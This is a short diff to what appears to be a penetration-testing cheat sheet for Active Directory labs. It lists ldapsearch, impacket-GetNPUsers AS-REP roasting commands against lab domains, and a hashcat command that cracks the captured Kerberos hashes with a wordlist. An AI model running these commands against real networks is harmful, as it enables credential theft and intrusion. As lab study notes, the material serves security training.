@@ -42,7 +42,8 @@ ldapsearch -H ldap://dc01.domain.com -D '' -w '' -b "dc=offsec,dc=com" | grep -i
 ```bash
 impacket-GetNPUsers -dc-ip <IP> -request  oscp.exam/-format hashcat
 impacket-GetNPUsers oscp.exam/user -dc-ip <IP> -format hashcat
-for user in $(cat users.txt); do impacket-GetNPUsers megabank.LOCAL/$user -dc-ip 10.10.10.169 -format hashcat; done 
+
+Impacket-GetNPUsers INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
 
 hashcat -m 18200 crackme.txt ~/rockyou.txt -O -r ~/opt/wordlists/best64.rule -O
 ```
